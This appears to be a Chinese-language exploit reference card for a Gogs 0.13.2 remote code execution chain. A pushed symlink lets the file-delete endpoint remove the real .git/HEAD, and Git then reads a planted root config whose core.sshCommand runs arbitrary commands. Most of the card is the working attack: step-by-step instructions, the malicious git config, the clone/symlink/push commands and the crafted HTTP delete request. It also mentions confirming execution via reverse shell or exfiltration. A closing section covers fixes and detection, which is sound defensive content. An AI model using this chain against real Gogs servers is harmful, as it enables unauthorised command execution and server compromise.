---
id: web-golang-gogs-symlink-delete-git-head-sshcommand-rce
title: Gogs 符号链接任意文件删除 + Git 仓库上溯劫持：删除 .git/HEAD 触发 core.sshCommand RCE
type: scenario
domain: web
path: web/golang
technique: gogs-symlink-delete-git-head-repo-discovery-sshcommand-rce
aliases:
- Gogs 最新 RCE
- Gogs 符号链接删除
- true_git_dir
- 删除 .git/HEAD
- Git 向上查找仓库
- core.sshCommand 执行
- Gogs 0.13.2 RCE
tags:
- gogs
- go
- git
- symlink
- arbitrary-file-delete
- rce
- sshCommand
- repo-discovery
- cve-2024-39931
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V267
  verified_at: '2026-11-07T18:23:23+08:00'
  notes: '已对照原文与全部23张图核对：core.sshCommand 本地实验（图02-03，/tmp/poc 内容含追加的 git-upload-pack 参数）、git push symlink true_git_dir（图11-14）、仓库根构造 HEAD/config/objects/refs/info（图15-17）、Burp POST /admin1/tset/_delete/master/true_git_dir/HEAD（图18-19）、提交触发后 internal server error（图20-21）、500 页泄露 Application Version: 0.13.2（图21/23）、Docker 镜像 gogs/gogs:0.13.2（图03），均与卡片一致。与 CVE-2025-64111 卡差异核对：候选卡入口为 UpdateRepoFile/contents API 符号链接写 .git/config；本卡入口为 DeleteRepoFile/_delete 符号链接删除 .git/HEAD + Git 仓库上溯至工作树根恶意 config，属不同利用链，保留两卡。dedup 工具因同产品同 sink 给出 merge 建议，但实际入口/前置/触发均不同，不合并、不删除。原文未给出该新链完整受影响区间，affected_versions 未设置。未验证点：文中 PoC 未复跑；受影响版本区间需以官方公告为准。'
---

## 一句话结论

Gogs（文章环境 0.13.2）的仓库文件删除接口会跟随仓库内的符号链接：攻击者先通过 git push 提交一个指向 `.git` 的符号链接 `true_git_dir`，再请求删除 `true_git_dir/HEAD`，实际删除真实 `.git/HEAD`；原始 `.git` 被破坏后，Git 不再把该目录识别为仓库，转而向上查找，最终把工作树根目录（攻击者预置了恶意 `HEAD`、`config`、`objects/`、`refs/` 等）当成标准仓库，读取其中的 `core.sshCommand` 并执行任意命令。

## 原理

- **Git 的 `core.sshCommand` sink**：Git 在需要走 SSH 的操作（fetch/push/clone/ls-remote 等）中会读取仓库配置的 `core.sshCommand`，把该字符串当作 SSH 客户端命令执行，并把 `-o SendEnv=GIT_PROTOCOL git@host git-upload-pack ...` 之类的参数追加在后面。文章在本地 `.git/config` 写入 `sshCommand = echo test > /tmp/poc` 后，通过 Gogs Web 提交触发，`/tmp/poc` 内容为 `test -o SendEnv=GIT_PROTOCOL git@github.com git-upload-pack 'git@github.com:test/linux.git'`，证明该配置确实被执行。
- **Git 仓库识别与上溯**：Git 通过 `.git` 目录（或 `GIT_DIR`）判断仓库；标准 `.git` 需要 `HEAD`、`config`、`objects/`、`refs/` 等。若 `.git/HEAD` 被删除，Git 认为当前目录不是有效仓库，会向父目录逐级查找；如果工作树根目录本身满足仓库结构（含 `HEAD`、`config`、`objects/`、`refs/`、`info/`、`packed-refs` 等），Git 会把根目录当作仓库（或 bare 仓库）并使用其 `config`。
- **符号链接绕过 `.git` 过滤**：Gogs 在 CVE-2024-39931 的补丁中对 `opts.TreePath` 增加了 `isRepositoryGitPath` 检查，阻止直接上传/写入 `.git` 路径。但攻击者提交的 `true_git_dir` 是一个普通文件路径（符号链接内容指向 `.git`），不匹配 `.git` 字符串；Gogs 删除 `true_git_dir/HEAD` 时在文件系统层解析符号链接，实际操作的是 `.git/HEAD`。
- **构造仓库根**：工作树根目录需要伪装成 Git 仓库。文章给出的目录树为 `HEAD`、`config`（含恶意 `sshCommand` 与一个 SSH remote）、`refs/heads/`、`objects/`、`info/`、`.git/`（原始目录，随后被破坏）、`README.md`；实测 `description` 和 `index` 可以省略。`config` 中保留 `[remote "origin"]` 的 ssh URL 与 `[branch "master"]`，使后续 Git 操作会走 SSH，从而触发 `core.sshCommand`。
- **为什么必须用 Linux 提交符号链接**：Git 的 symlink 是 Linux 文件系统对象；Windows 客户端无法保留/创建 Linux 符号链接（复制时会变成普通文件或直接报错），所以文章要求攻击机为 Kali/Linux，在克隆目录执行 `ln -s .git true_git_dir` 后 `git add`/`git push`。
- **触发与报错**：删除 `.git/HEAD` 后，Gogs UI 会报 “internal server error”/500（因为原仓库已损坏）；再做一次提交/仓库操作时，Gogs 后端执行 Git 命令，Git 上溯到根目录并执行恶意 `config` 的 `sshCommand`。因此报错不代表利用失败，命令已经执行。

## 触发条件

- 目标 Gogs 开启注册/允许攻击者创建仓库并 push（文章环境 `gogs/gogs:0.13.2`）；攻击者拥有有效账号与仓库写权限。
- Gogs 的删除接口在删除文件时跟随符号链接，且未在解析真实路径后重新做 `.git` 校验（文章测试版本受影响；原文未给完整影响区间）。
- 攻击机为 Linux（能创建并 push symlink）；Windows 客户端无法完成 symlink 提交。
- 仓库工作树根目录可提交 `HEAD`、`config`、`objects/`、`refs/` 等文件，且 Gogs 不会阻止这些文件名（`.git` 路径被过滤，但根目录同名文件可以）。
- 后续存在一次会调用 Git 且需要 SSH 的操作（如 Gogs Web 提交/拉取），使 `core.sshCommand` 被执行。

## 利用步骤

1. 注册 Gogs 账号（或使用已有账号），在账户设置中添加攻击机 SSH 公钥，确认可用 SSH 克隆/推送仓库。
2. 在 Linux 攻击机上克隆目标仓库，构造伪装仓库根目录：创建 `HEAD`、`config`（含 `sshCommand = <命令>` 和 SSH remote）、`objects/`、`refs/heads/`、`info/`、`packed-refs`，保留 `README.md`；`description`、`index` 可省略。
3. 创建符号链接：`ln -s .git true_git_dir`；`git add true_git_dir`（以及根目录的 HEAD/config 等文件），`git commit`，`git push origin master`。
4. 在 Gogs Web 中随便删除一个仓库文件并抓包，得到 `POST /<owner>/<repo>/_delete/<branch>/<file>` 请求与 CSRF token。
5. 把路径改为 `POST /<owner>/<repo>/_delete/master/true_git_dir/HEAD`，保留 Cookie/CSRF，发送；响应会报错（internal server error/500），但真实 `.git/HEAD` 已被删除。
6. 再触发一次会执行 Git 的 Gogs 操作（如 Web 提交）；Git 上溯到工作树根目录，读取恶意 `config`，执行 `sshCommand`。检查 `/tmp/poc`、反弹 Shell 或 DNS/HTTP 外带确认执行。
7. 版本确认：访问损坏后的仓库页面，500 错误可能泄露 `Application Version`（文中为 0.13.2）；也可结合 `isRepositoryGitPath` 补丁特征判断。

## PoC

恶意 `config`（提交到仓库根目录，`core.sshCommand` 换成实际命令）：

```ini
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
	sshCommand = echo test > /tmp/poc
[remote "origin"]
	url = git@github.com:test/linux.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

提交符号链接：

```bash
git clone ssh://git@<gogs>:10022/<owner>/<repo>.git
cd <repo>
ln -s .git true_git_dir
git add true_git_dir HEAD config objects refs info packed-refs README.md
git commit -m "Add a symlink"
git push origin master
```

删除真实 `.git/HEAD` 的请求：

```http
POST /<owner>/<repo>/_delete/master/true_git_dir/HEAD HTTP/1.1
Host: <gogs>:<port>
Content-Type: application/x-www-form-urlencoded
Cookie: lang=zh-CN; i_like_gogs=<session>; gogs_awesome=<user>; gogs_incredible=<csrf-cookie>
Content-Length: <len>

_csrf=<token>&commit_summary=&commit_message=&commit_choice=direct&new_branch_name=
```

说明：PoC 按文章请求与配置整理，未在本机复现；不同 Gogs 版本的路由前缀、CSRF 参数名与删除接口可能不同，需按实际抓包调整。

## 变体与关联

- **同 sink 不同入口**：CVE-2025-64111 通过 UpdateRepoFile 符号链接绕过 `.git` 校验直接写 `core.sshCommand`；本卡通过“删除 `.git/HEAD` + Git 上溯”间接使用仓库根目录的恶意 `config`，入口与前置不同。
- **同符号链接不同 sink**：CVE-2024-56731/CVE-2025-8110 把符号链接写到 `hooks/pre-receive`，由 push 触发钩子；本卡利用删除接口与 Git 仓库发现机制，不依赖 hooks 目录。
- **任意文件删除原语**：删除 `true_git_dir/<任意 .git 内文件>` 可破坏仓库完整性（DoS）、删除 `index`/`HEAD` 等迫使 Git 重新发现仓库；也可尝试删除其他敏感文件，但受 Gogs 路径过滤与权限限制。
- 关联：[[web-golang-gogs-updaterepofile-symlink-git-config-rce]]（CVE-2025-64111，写 `.git/config` 的同类 `core.sshCommand` 利用）、[[web-golang-gogs-hooks-prereceive-symlink-write-rce]]（CVE-2024-56731/CVE-2025-8110 的 hooks 写入链）、[[web-golang-gogs-ssh-env-split-string-argument-injection]]（CVE-2024-39930，Gogs SSH 参数注入）。
- 边界：Gogs 在删除前对路径做 `realpath` 并在解析后重新校验 `.git`、禁止仓库内符号链接、禁用注册/仓库创建、Git 版本不读取 `core.sshCommand`、或没有后续 Git 操作触发时，链路不成立。

## 检测与防御

- **修复**：删除文件前先 `filepath.EvalSymlinks`/`realpath`，对解析后的真实路径重新执行 `isRepositoryGitPath` 校验；禁止在仓库中跟踪符号链接（或禁止 symlink 指向 `.git`）；限制 `_delete` 接口只能删除仓库工作树内普通文件。
- **版本与配置**：升级到包含该修复的 Gogs 版本；关闭开放注册，限制仓库创建/推送权限；对高权限仓库启用审核。
- **检测**：监控提交历史中出现符号链接（Git mode `120000`）且指向 `.git`；监控仓库根目录出现 `HEAD`/`config`/`objects`/`refs` 等 Git 元数据文件；监控 `_delete` 请求路径含 `..` 或指向 `.git` 内部文件；监控 Gogs 进程派生的 Git 子进程及其 `core.sshCommand` 执行。
- **响应**：检查仓库 `.git/config` 是否被篡改、`.git/HEAD` 是否缺失；恢复仓库并轮换 Gogs 凭据/SSH 密钥；排查同一实例的其他仓库与用户。
